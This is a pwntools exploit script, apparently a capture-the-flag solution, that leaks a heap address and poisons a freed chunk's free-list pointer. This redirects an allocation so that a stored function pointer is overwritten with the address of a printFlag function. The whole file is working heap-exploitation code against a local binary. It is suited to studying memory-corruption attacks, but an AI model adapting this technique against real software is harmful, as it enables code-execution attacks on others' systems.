#!/usr/bin/env python2

from pwn import *
from struct import *

binary = "./main.elf"

p = process(binary)


def showChunk():
	log.info(p.recvuntil(":"))	
    	p.send("1"+"\x00"*7)
    	log.info(p.recvuntil("\n"))


def addChunk(length, name, zeros):
	log.info(p.recvuntil(":"))
	p.send("2"+"\x00"*7)
	log.info(p.recvuntil(":"))
	
	p.send(str(length) + zeros)
	log.info(p.recvuntil(":"))
	p.send(name)

def deleteChunk(index):
	log.info(p.recvuntil(":"))
	p.send("4"+"\x00"*7)
	log.info(p.recvuntil(":"))
	p.send(index+"\x00"*7)
	log.info(p.recvuntil("!!"))

def exitProgram():
	log.info(p.recvuntil(":"))
	p.send("5"+"\x00"*7)
	#log.info(p.recvuntil(";)", timeout=0.2))
	log.info(p.recvline())
	log.info(p.recvline())

	   
def modifyChunk(index, length, name):
	log.info(p.recvuntil(":"))
	p.send("3"+"\x00"*7)
	log.info(p.recvuntil(":"))
	p.send(index + "\x00"*7 )
	log.info(p.recvuntil(":"))
	p.send(str(length) + "\x00"*6 )
	log.info(p.recvuntil(":"))
	p.send(name)
	

size = 0x3
created_chunklist = 0x6020e8

addChunk(size, "A"*size, "\x00"*7)    
addChunk(size, "B"*size, "\x00"*7)   
addChunk(size, "C"*size, "\x00"*7)  
#addChunk(size, "D"*size, "\x00"*7) 


heapOffset = 0x30
heapAddrChunk = u64(p.leak(created_chunklist, 8))
log.info("heap address of the first allocated chunk: " +  hex(heapAddrChunk))
heapAddress = heapAddrChunk - heapOffset
log.info("start heap address: " +  hex(heapAddress))


#deleteChunk("3")
deleteChunk("2") # its fd link points to null
deleteChunk("1") # its fd link points to heap address of  idx = "1"

modifyChunk("0", 0x28, "A"*24 + "\x21\x00\x00\x00\x00\x00\x00\x00" + p64(heapAddress)) 
#overwrite the first chunk (idx = "1") so its fd link shows to the start of the heap, where the finction pointer of epilogue is stored
#so the next allocation allocates the heap space of idx = "1"
#and the second allocation now will allocate the first heap chunk, where created_chunk's prologue and epilogue are stored, since we changed the address of the next free block with the modifyChunk

addChunk(size, "A"*size, "\x00"*7) 
addChunk(0x10, "\xb6\x09\x40\x00\x00\x00\x00\x00" + "\x3c\x0e\x40\x00\x00\x00\x00\x00", "\x00"*6)
#overwrite the address of function epilogue with the address of printFlag function

#showChunk() 

exitProgram()